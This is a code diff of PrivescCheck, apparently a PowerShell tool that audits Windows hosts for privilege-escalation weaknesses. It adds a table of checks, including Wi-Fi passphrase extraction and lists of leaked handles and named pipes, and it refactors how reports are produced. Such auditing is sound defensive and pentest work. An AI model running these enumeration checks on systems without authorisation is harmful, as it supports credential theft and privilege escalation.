+"NET_ADAPTERS",                   "Invoke-NetworkAdaptersCheck",                "TA0043 - Reconnaissance",       "Network interfaces",                  "Info",     "List",     "True",     "True",         "False",        "Collect detailed information about all active Ethernet adapters."
+"NET_TCP_ENDPOINTS",              "Invoke-TcpEndpointsCheck",                   "TA0004 - Privilege Escalation", "TCP endpoint servers",                "Info",     "Table",    "True",     "False",        "False",        "List all TCP ports that are in a LISTEN state. For each one, the corresponding process is also returned."
+"NET_UDP_ENDPOINTS",              "Invoke-UdpEndpointsCheck",                   "TA0004 - Privilege Escalation", "UDP endpoint servers",                "Info",     "Table",    "True",     "True",         "False",        "List all UDP ports that are in a LISTEN state. For each one, the corresponding process is also returned. DNS is filtered out to minimize the output."
+"NET_WLAN",                       "Invoke-WlanProfilesCheck",                   "TA0006 - Credential Access",    "Wi-Fi profiles",                      "Info",     "List",     "True",     "True",         "False",        "Enumerate saved Wifi profiles. For WEP/WPA-PSK profiles, the clear-text passphrase is extracted (when possible). For 802.1x profiles, a series of tests is performed to highlight potential misconfiguration."
+"NET_AIRSTRIKE",                  "Invoke-AirstrikeAttackCheck",                "TA0001 - Initial Access",       "Network selection from lock screen",  "Info",     "List",     "True",     "True",         "False",        "Checks whether the 'Do not display network selection UI' policy is enforced on workstations (c.f. Airstrike attack)."
+"UPDATE_HISTORY",                 "Invoke-WindowsUpdateCheck",                  "TA0004 - Privilege Escalation", "Last Windows Update date",            "Info",     "Table",    "True",     "True",         "False",        "Interact with the Windows Update service and determine when the system was last updated. Note that this check might be unreliable."
+"UPDATE_HOTFIX_INFO",             "Invoke-HotFixCheck -Info",                   "TA0004 - Privilege Escalation", "Windows Update history",              "Info",     "Table",    "True",     "True",         "False",        "Enumerate the installed updates and hotfixes by parsing the registry. If this fails, the check will fall back to the built-in 'Get-HotFix' cmdlet."
+"UPDATE_HOTFIX",                  "Invoke-HotFixCheck",                         "TA0004 - Privilege Escalation", "Latest updates installed",            "Medium",   "Table",    "False",    "True",         "False",        "Enumerate the installed updates and hotfixes and check whether a patch was applied in the last 31 days."
+"MISC_AVEDR",                     "Invoke-EndpointProtectionCheck",             "TA0005 - Defense Evasion",      "Endpoint protection software",        "Info",     "Table",    "True",     "True",         "False",        "Enumerate installed security products (AV, EDR). This check is based on keyword matching (loaded DLLs, running processes, installed applications and registered services)."
+"MISC_DEFENDER_EXCLUSIONS",       "Invoke-DefenderExclusionsCheck",             "TA0005 - Defense Evasion",      "Windows Defender exclusions",         "Info",     "Table",    "True",     "True",         "False",        "List Microsoft Defender exclusions that were configured both locally and through GPO."
+"MISC_SYSINFO",                   "Invoke-SystemInfoCheck",                     "TA0043 - Reconnaissance",       "Windows version",                     "Info",     "Table",    "True",     "True",         "False",        "Print the detailed version number of the Operating System. If we can't get the update history, this might be useful."
+"MISC_ADMINS",                    "Invoke-LocalAdminGroupCheck",                "TA0043 - Reconnaissance",       "Local administrators group",          "Info",     "Table",    "True",     "True",         "False",        "Enumerate the users and groups that belong to the local 'Administrators' group."
+"MISC_USER_SESSION_LIST",         "Invoke-UserSessionListCheck",                "TA0004 - Privilege Escalation", "User sessions",                       "Info",     "Table",    "False",    "True",         "False",        "Enumerate the sessions of the currently logged-on users. It might be possible to capture or relay the NTLM/Kerberos authentication of these users (RemotePotato0, KrbRelay)."
+"MISC_HOMES",                     "Invoke-UsersHomeFolderCheck",                "TA0043 - Reconnaissance",       "User home folders",                   "Info",     "Table",    "True",     "False",        "False",        "Enumerate local HOME folders and check for potentially weak permissions."
+"MISC_MACHINE_ROLE",              "Invoke-MachineRoleCheck",                    "TA0043 - Reconnaissance",       "Machine role",                        "Info",     "Table",    "True",     "True",         "False",        "Simply return the machine's role. It can be either 'Workstation', 'Server' or 'Domain Controller'."
+"MISC_STARTUP_EVENTS",            "Invoke-SystemStartupHistoryCheck",           "TA0004 - Privilege Escalation", "System startup history",              "Info",     "Table",    "True",     "True",         "False",        "Retrieve the machine's startup history. This might be useful to figure out how often a server is rebooted. In the case of a workstation, such metric isn't as relevant."
+"MISC_STARTUP_LAST",              "Invoke-SystemStartupCheck",                  "TA0004 - Privilege Escalation", "Last system startup time",            "Info",     "Table",    "True",     "True",         "False",        "Determine the last system startup date and time based on the current tick count. Note that this might be unreliable."
+"MISC_DRIVES",                    "Invoke-SystemDrivesCheck",                   "TA0043 - Reconnaissance",       "Filesystem drives",                   "Info",     "Table",    "True",     "True",         "False",        "List partitions, removable storage and mapped network shares."
+"MISC_NAMED_PIPES",               "Invoke-NamedPipePermissionsCheck",           "TA0004 - Privilege Escalation", "Named pipe permissions",              "Info",     "List",     "True",     "False",        "True",         "List modifiable named pipes that are not owned by the current user."
+"MISC_LEAKED_HANDLES",            "Invoke-ExploitableLeakedHandlesCheck",       "TA0004 - Privilege Escalation", "Exploitable leaked handles",          "Info",     "List",     "True",     "False",        "True",         "List leaked handles to privileged objects such as Processes, Threads, and Files."
 "@
 
     # Reset all global ArrayLists on startup
@@ -155,7 +144,7 @@ function Invoke-PrivescCheck {
     }
 
     $CheckCounter = 0
-    ForEach ($Check in $AllChecks) {
+    foreach ($Check in $AllChecks) {
 
         $CheckCounter += 1
         $RunIfAdminCheck = [System.Convert]::ToBoolean($Check.RunIfAdmin)
@@ -201,7 +190,8 @@ function Invoke-PrivescCheck {
 
     # Print a report on the terminal as an 'ASCII-art' table with colors using 'Write-Host'. Therefore,
     # this will be only visible if run from a 'real' terminal.
-    Show-PrivescCheckAsciiReport
+    # Show-PrivescCheckAsciiReport
+    Write-ShortReport
 
     # If the 'Report' option was specified, write a report to a file using the value of this parameter
     # as the basename (or path + basename). The extension is then determined based on the chosen
@@ -218,20 +208,12 @@ function Invoke-PrivescCheck {
             # report corresponding to the current format and write it to a file using the previously formatted
             # filename.
             $ReportFileName = "$($Report.Trim()).$($_.ToLower())"
-            if ($_ -eq "TXT") {
-                Write-TxtReport -AllResults $ResultArrayList | Out-File $ReportFileName
-            }
-            elseif ($_ -eq "HTML") {
-                Write-HtmlReport -AllResults $ResultArrayList | Out-File $ReportFileName
-            }
-            elseif ($_ -eq "CSV") {
-                Write-CsvReport -AllResults $ResultArrayList | Out-File $ReportFileName
-            }
-            elseif ($_ -eq "XML") {
-                Write-XmlReport -AllResults $ResultArrayList | Out-File $ReportFileName
-            }
-            else {
-                Write-Warning "`r`nReport format not implemented: $($Format.ToUpper())`r`n"
+            switch ($_) {
+                "TXT"   { Write-TxtReport  -AllResults $ResultArrayList | Out-File $ReportFileName }
+                "HTML"  { Write-HtmlReport -AllResults $ResultArrayList | Out-File $ReportFileName }
+                "CSV"   { Write-CsvReport  -AllResults $ResultArrayList | Out-File $ReportFileName }
+                "XML"   { Write-XmlReport  -AllResults $ResultArrayList | Out-File $ReportFileName }
+                default { Write-Warning "`r`nReport format not implemented: $($Format.ToUpper())`r`n" }
             }
         }
     }
@@ -239,20 +221,19 @@ function Invoke-PrivescCheck {
     # If the 'Extended' mode was not specified, print a warning message, unless the 'Force' parameter
     # was specified.
     if ((-not $Extended) -and (-not $Force) -and (-not $Silent)) {
-
         Write-Warning "To get more info, run this script with the option '-Extended'."
     }
 }
 
 function Invoke-Check {
 
-    [CmdletBinding()] Param(
-        [Object]
-        $Check
+    [CmdletBinding()] param(
+        [object] $Check
     )
 
     $Result = Invoke-Expression -Command "$($Check.Command)"
     $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRaw" -Value $Result
+
     if ($Check.Format -eq "Table") {
         $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRawString" -Value $($Result | Format-Table | Out-String)
     }
@@ -260,55 +241,47 @@ function Invoke-Check {
         $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRawString" -Value $($Result | Format-List | Out-String)
     }
 
-    if ($Check.Type -Like "Vuln") {
-        # Handle "Vuln" checks here.
-        if ($Result) {
-            # If there is at least one result, it means that we found a vulnerability. So, set the 
-            # "Compliance" to False.
-            $Check | Add-Member -MemberType "NoteProperty" -Name "Compliance" -Value $false
+    $IsInfoCheck = $Check.Severity -eq "Info"
+
+    if ($IsInfoCheck) {
+        if ($null -eq $Result) {
+            # If the check did not yield any result, we cannot determine whether it is compliant or not. So,
+            # in this case, set the compliance to "N/A".
+            $Compliance = "N/A"
         }
         else {
-            # If no object is returned, it means that no vulnerability was found. So, set the "Compliance"
-            # to True. Also, set the severity to "None".
-            $Check.Severity = "None"
-            $Check | Add-Member -MemberType "NoteProperty" -Name "Compliance" -Value $true
-        }
-    }
-    else {
-        # Handle "Info" checks here.
-        if ($Result) {
             # If the result list is not empty, iterate it and determine the compliance as follows. First,
             # if we find an object that does not have a "Compliance" attribute, set the compliance to "N/A".
             # However, if the returned objects have a "Compliance" attribute, then assume that the compliance
             # is True by default, and set it to False as soon as we find a non-compliant result.
             $Compliance = "True"
-            ForEach ($Res in [object[]]$Result) {
+            foreach ($Res in [object[]]$Result) {
                 if ($null -eq $Res.Compliance) { $Compliance = "N/A"; break }
                 if ($Res.Compliance -eq $false) { $Compliance = "False"; break }
             }
         }
-        else {
-            # If the check did not yield any result, we cannot determine whether it is compliant or not. So,
-            # in this case, set the compliance to "N/A".
-            $Compliance = "N/A"
-        }
         $Check | Add-Member -MemberType "NoteProperty" -Name "Compliance" -Value $Compliance
         $Check.Severity = "None"
     }
+    else {
+        $Check | Add-Member -MemberType "NoteProperty" -Name "Compliance" -Value $($null -eq $Result)
+        $Check.Severity = $(if ($null -eq $Result) { "None" } else { $Check.Severity } )
+    }
+
     [void] $ResultArrayList.Add($Check)
     $Check
 }
 
 function Write-CheckBanner {
 
-    [OutputType([String])]
-    [CmdletBinding()] Param(
-        [Object]
-        $Check
+    [OutputType([string])]
+    [CmdletBinding()] param(
+        [object] $Check,
+        [switch] $Ascii
     )
-
+    
     function Split-Description {
-        Param([String]$Description)
+        param([string]$Description)
 
         $DescriptionSplit = New-Object System.Collections.ArrayList
         $TempOld = ""
@@ -316,7 +289,7 @@ function Write-CheckBanner {
         $Description.Split(' ') | ForEach-Object {
 
             $TempNew = "$($TempOld) $($_)".Trim()
-            if ($TempNew.Length -gt 53) {
+            if ($TempNew.Length -gt 60) {
                 [void]$DescriptionSplit.Add($TempOld)
                 $TempOld = "$($_)"
             }
@@ -330,52 +303,45 @@ function Write-CheckBanner {
         $DescriptionSplit
     }
 
-    $Title = "$($Check.Category.ToUpper()) > $($Check.DisplayName)"
-    if ($Title.Length -gt 46) {
-        throw "Input title is too long."
-    }
+    $HeavyVertical =          [char] $(if ($Ascii) { '|' } else { 0x2503 })
+    $HeavyHorizontal =        [char] $(if ($Ascii) { '-' } else { 0x2501 })
+    $HeavyVerticalAndRight =  [char] $(if ($Ascii) { '+' } else { 0x2523 })
+    $HeavyVerticalAndLeft =   [char] $(if ($Ascii) { '+' } else { 0x252B })
+    $HeavyDownAndHorizontal = [char] $(if ($Ascii) { '+' } else { 0x2533 })
+    $HeavyUpAndHorizontal =   [char] $(if ($Ascii) { '+' } else { 0x253B })
+    $HeavyDownAndLeft =       [char] $(if ($Ascii) { '+' } else { 0x2513 })
+    $HeavyDownAndRight =      [char] $(if ($Ascii) { '+' } else { 0x250F })
+    $HeavyUpAndRight =        [char] $(if ($Ascii) { '+' } else { 0x2517 })
+    $HeavyUpAndLeft =         [char] $(if ($Ascii) { '+' } else { 0x251B })
 
     $Result = ""
-    $Result += "+------+------------------------------------------------+------+`r`n"
-    $Result += "| TEST | $Title$(' '*(46 - $Title.Length)) | $($Check.Type.ToUpper()) |`r`n"
-    $Result += "+------+------------------------------------------------+------+`r`n"
+    $Result += "$($HeavyDownAndRight)$("$HeavyHorizontal" * 10)$($HeavyDownAndHorizontal)$("$HeavyHorizontal" * 51)$($HeavyDownAndLeft)`n"
+    $Result += "$($HeavyVertical) CATEGORY $($HeavyVertical) $($Check.Category)$(' ' * (49 - $Check.Category.Length)) $($HeavyVertical)`n"
+    $Result += "$($HeavyVertical) NAME     $($HeavyVertical) $($Check.DisplayName)$(' ' * (49 - $Check.DisplayName.Length)) $($HeavyVertical)`n"
+    $Result += "$($HeavyVerticalAndRight)$("$HeavyHorizontal" * 10)$($HeavyUpAndHorizontal)$("$HeavyHorizontal" * 51)$($HeavyVerticalAndLeft)`n"
     Split-Description -Description $Check.Description | ForEach-Object {
-        $Result += "| $(if ($Flag) { '    ' } else { 'DESC'; $Flag = $true }) | $($_)$(' '*(53 - ([String]$_).Length)) |`r`n"
+        $Result += "$($HeavyVertical) $($_)$(' '*(60 - ([String]$_).Length)) $($HeavyVertical)`n"
     }
-    $Result += "+------+-------------------------------------------------------+"
+    $Result += "$($HeavyUpAndRight)$("$HeavyHorizontal" * 62)$($HeavyUpAndLeft)"
     $Result
 }
 
 function Write-CheckResult {
 
-    [OutputType([String])]
-    [CmdletBinding()] Param(
-        [Object]
-        $CheckResult
+    [OutputType([string])]
+    [CmdletBinding()] param(
+        [object] $CheckResult
     )
 
-    if ($CheckResult.ResultRaw) {
+    $FindingCount = $(if ($CheckResult.ResultRaw) { ([Object[]]$CheckResult.ResultRaw).Length } else { 0 })
 
-        "[*] Found $(([Object[]]$CheckResult.ResultRaw).Length) result(s)."
+    "[*] Number of findings: $($FindingCount)`n$(if ($null -ne $FindingOutput) { $FindingOutput })"
 
-        if ($CheckResult.Format -eq "Table") {
-            $CheckResult.ResultRaw | Format-Table -AutoSize
-        }
-        elseif ($CheckResult.Format -eq "List") {
-            $CheckResult.ResultRaw | Format-List
-        }
-
-    }
-    else {
-
-        # If no result was returned by the check, print a message that shows that the host is not vulnerable
-        # if it's a "vuln" check or, printer a message that shows that nothing was found.
-
-        if ($CheckResult.Type -eq "Vuln") {
-            "[!] Not vulnerable."
-        }
-        else {
-            "[!] Nothing found."
+    if ($FindingCount -gt 0) {
+        switch ($CheckResult.Format) {
+            "Table"     { $CheckResult.ResultRaw | Format-Table -AutoSize }
+            "List"      { $CheckResult.ResultRaw | Format-List }
+            default     { Write-Warning "Unknown format: $($CheckResult.Format)" }
         }
     }
 
@@ -384,23 +350,20 @@ function Write-CheckResult {
 
 function Write-TxtReport {
 
-    [CmdletBinding()] Param(
-        [Object[]]
-        $AllResults
+    [CmdletBinding()] param(
+        [object[]] $AllResults
     )
 
     $AllResults | ForEach-Object {
-
-        Write-CheckBanner -Check $_
+        Write-CheckBanner -Check $_ -Ascii
         Write-CheckResult -CheckResult $_
     }
 }
 
 function Write-CsvReport {
 
-    [CmdletBinding()] Param(
-        [Object[]]
-        $AllResults
+    [CmdletBinding()] param(
+        [object[]] $AllResults
     )
 
     $AllResults | Sort-Object -Property "Category" | Select-Object -Property "Category","DisplayName","Description","Compliance","Severity","ResultRawString" | ConvertTo-Csv -NoTypeInformation
@@ -416,24 +379,22 @@ function Write-XmlReport {
     https://stackoverflow.com/questions/45706565/how-to-remove-special-bad-characters-from-xml-using-powershell
     #>
 
-    [CmdletBinding()] Param(
-        [Object[]]
-        $AllResults
+    [CmdletBinding()] param(
+        [object[]] $AllResults
     )
 
     $AuthorizedXmlCharactersRegex = "[^\x09\x0A\x0D\x20-\xD7FF\xE000-\xFFFD\x10000\x10FFFF]"
     $AllResults | ForEach-Object {
         $_.ResultRawString = [System.Text.RegularExpressions.Regex]::Replace($_.ResultRawString, $AuthorizedXmlCharactersRegex, "")
         $_
-    } | Sort-Object -Property "Category" | Select-Object Id,Category,DisplayName,Description,Type,Compliance,Severity,ResultRawString | ConvertTo-Xml -As String
+    } | Sort-Object -Property "Category" | Select-Object Id,Category,DisplayName,Description,Compliance,Severity,ResultRawString | ConvertTo-Xml -As String
 }
 
 function Write-HtmlReport {
 
-    [OutputType([String])]
-    [CmdletBinding()] Param(
-        [Object[]]
-        $AllResults
+    [OutputType([string])]
+    [CmdletBinding()] param(
+        [object[]] $AllResults
     )
 
     $JavaScript = @"
@@ -573,110 +534,69 @@ $($JavaScript)
     $Html
 }
 
-function Show-PrivescCheckAsciiReport {
-    <#
-    .SYNOPSIS
+function Get-SeverityColor {
 
-    Write a short report on the terminal in ASCII-art using 'Write-Host'.
+    param (
+        [ValidateSet("Info","Low","Medium","High")]
+        [string] $Severity
+    )
 
-    Author: @itm4n
-    License: BSD 3-Clause
+    switch ($Severity) {
+        "Info"      { "DarkCyan" }
+        "Low"       { "DarkGreen" }
+        "Medium"    { "Yellow" }
+        "High"      { "Red" }
+    }
+}
 
-    .DESCRIPTION
+function Write-ShortReport {
 
-    Once all the checks were executed, this function writes a table in ASCII-art that summarizes the results with fancy colors. As a pentester or a system administrator, this should help you quickly spot weaknesses on the local machine.
+    [CmdletBinding()] param()
 
-    .EXAMPLE
+    $HeavyVertical = [char] 0x2503
+    # $HeavyVerticalAndRight = [char] 0x2523
+    # $HeavyVerticalAndLeft = [char] 0x252B
+    $HeavyHorizontal = [char] 0x2501
+    # $HeavyDownAndHorizontal = [char] 0x2533
+    # $HeavyUpAndHorizontal = [char] 0x253B
+    $HeavyDownAndLeft = [char] 0x2513
+    $HeavyDownAndRight = [char] 0x250F
+    $HeavyUpAndRight = [char] 0x2517
+    $HeavyUpAndLeft = [char] 0x251B
+    $RightwardsArrow = [char] 0x2192
 
-    PS C:\> Show-PrivescCheckAsciiReport
+    Write-Host -ForegroundColor White "$($HeavyDownAndRight)$("$HeavyHorizontal" * 62)$($HeavyDownAndLeft)"
+    Write-Host -ForegroundColor White "$($HeavyVertical)$(" " * 17)~~~ PrivescCheck Summary ~~~$(" " * 17)$($HeavyVertical)"
+    Write-Host -ForegroundColor White "$($HeavyUpAndRight)$("$HeavyHorizontal" * 62)$($HeavyUpAndLeft)"
 
-    +-----------------------------------------------------------------------------+
-    |                         ~~~ PrivescCheck Report ~~~                         |
-    +----+------+-----------------------------------------------------------------+
-    | OK | None | APPS > Modifiable Apps                                          |
-    | OK | None | APPS > Modifiable Apps Run on Startup                           |
-    | OK | None | CONFIG > SCCM Cache Folder                                      |
-    | OK | None | CONFIG > WSUS Configuration                                     |
-    | OK | None | CONFIG > AlwaysInstallElevated                                  |
-    | NA | Info | CREDS > Credential Manager -> 3 result(s)                       |
-    | NA | Info | CREDS > Credential Manager (web) -> 1 result(s)                 |
-    | OK | None | CREDS > Unattend Files                                          |
-    | OK | None | CREDS > WinLogon                                                |
-    | OK | None | CREDS > SAM/SYSTEM Backup Files                                 |
-    | OK | None | CREDS > GPP Passwords                                           |
-    | OK | None | HARDENING > BitLocker                                           |
-    | NA | Info | SERVICES > Non-default Services -> 41 result(s)                 |
-    | NA | Info | SERVICES > Hijackable DLLs -> 2 result(s)                       |
-    | OK | None | SERVICES > System's %PATH%                                      |
-    | OK | None | SERVICES > Unquoted Paths                                       |
-    | OK | None | SERVICES > Binary Permissions                                   |
-    | OK | None | SERVICES > Permissions - SCM                                    |
-    | OK | None | SERVICES > Permissions - Registry                               |
-    | OK | None | UPDATES > System up to date?                                    |
-    | OK | None | USER > Privileges                                               |
-    | NA | Info | USER > Environment Variables                                    |
-    +----+------+-----------------------------------------------------------------+
+    # Show only vulnerabilities, i.e. any finding that has a final severity of at 
+    # least "low".
+    $AllVulnerabilities = $ResultArrayList | Where-Object { $_.Severity -ne "Info" -and $_.Severity -ne "None" }
+    $Categories = $AllVulnerabilities | Select-Object -ExpandProperty "Category" | Sort-Object -Unique
 
-    #>
-
-    [CmdletBinding()] Param()
-
-    Write-Host "+-----------------------------------------------------------------------------+"
-    Write-Host "|                         ~~~ PrivescCheck Report ~~~                         |"
-    Write-Host "+----+------+-----------------------------------------------------------------+"
-
-    $ResultArrayList | Sort-Object -Property Category | ForEach-Object {
-
-        Write-Host -NoNewline "| "
-        if ($_.Type -Like "vuln") {
-            if ($_.ResultRaw) { Write-Host -NoNewline -ForegroundColor "Red" "KO" } else { Write-Host -NoNewline -ForegroundColor "Green" "OK" }
-        }
-        else {
-            Write-Host -NoNewline -ForegroundColor "DarkGray" "NA"
-        }
-        Write-Host -NoNewline " | "
-
-        if ($_.Severity -Like "None") {
-            $SeverityColor = "DarkGray"
-            Write-Host -NoNewline -ForegroundColor $SeverityColor "None"
-        }
-        elseif ($_.Severity -Like "Low") {
-            $SeverityColor = "DarkGreen"
-            Write-Host -NoNewline -ForegroundColor $SeverityColor "Low "
-        }
-        elseif ($_.Severity -Like "Medium") {
-            $SeverityColor = "Yellow"
-            Write-Host -NoNewline -ForegroundColor $SeverityColor "Med."
-        }
-        elseif ($_.Severity -Like "High") {
-            $SeverityColor = "Red"
-            Write-Host -NoNewline -ForegroundColor $SeverityColor "High"
-        }
-        elseif ($_.Severity -Like "Info") {
-            $SeverityColor = "DarkCyan"
-            Write-Host -NoNewline -ForegroundColor $SeverityColor "Info"
-        }
-        else {
-            $SeverityColor = "White"
-            Write-Host -NoNewline "    "
-        }
-        Write-Host -NoNewline " |"
-
-        $Message = "$($_.Category.ToUpper()) > $($_.DisplayName)"
-        if ($_.ResultRaw) {
-            $Message = "$($Message) -> $(([Object[]]$_.ResultRaw).Length) result(s)"
-        }
-        $Padding = ' ' * $(63 - $Message.Length)
-
-        Write-Host -NoNewline " $($_.Category.ToUpper()) > $($_.DisplayName)"
-
-        if ($_.ResultRaw) {
-            Write-Host -NoNewLine " ->"
-            Write-Host -NoNewLine -ForegroundColor $SeverityColor " $(([Object[]]$_.ResultRaw).Length) result(s)"
-        }
-
-        Write-Host "$($Padding) |"
+    if ($null -eq $AllVulnerabilities) {
+        Write-Host -ForegroundColor White "No vulnerability found!"
+        return
     }
 
-    Write-Host "+----+------+-----------------------------------------------------------------+"
+    foreach ($Category in $Categories) {
+
+        $Vulnerabilities = $AllVulnerabilities | Where-Object { $_.Category -eq $Category }
+
+        Write-Host -ForegroundColor White " $($Category)"
+
+        foreach ($Vulnerability in $Vulnerabilities) {
+
+            $SeverityColor = Get-SeverityColor -Severity $Vulnerability.Severity
+            $FindingCount = $(([Object[]]$Vulnerability.ResultRaw).Length)
+
+            Write-Host -NoNewline -ForegroundColor White " -"
+            Write-Host -NoNewLine " $($Vulnerability.DisplayName) $($RightwardsArrow)"
+            Write-Host -NoNewline -ForegroundColor $SeverityColor " $($Vulnerability.Severity)"
+            Write-Host -NoNewLine " ($($FindingCount) finding"
+            Write-Host $(if ($FindingCount -gt 1) { "s)" } else { ")" })
+        }
+    }
+
+    Write-Host ""
 }
